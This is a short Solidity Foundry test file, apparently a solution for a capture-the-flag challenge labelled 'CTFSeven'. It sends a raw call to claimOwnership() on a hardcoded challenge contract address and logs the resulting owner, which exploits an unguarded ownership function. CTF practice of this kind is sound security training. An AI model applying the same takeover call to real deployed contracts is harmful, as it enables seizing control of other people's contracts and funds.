// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface Ichallenge {
    function mintFlag() external;
    function owner() external returns (address);
}

contract CTFSevenTest is Test {
    address constant CHALLENGE = 0xC962D4f4E772415475AA46Eed06cb1F2D4010c0A;

    function testCTFSeven() public {
        //craft message data
        bytes memory callData = abi.encodeWithSignature("claimOwnership()");

        (bool success,) = CHALLENGE.call(callData);

        success;

        console.log(Ichallenge(CHALLENGE).owner());
    }

    function testGetBytes() public pure {}
}
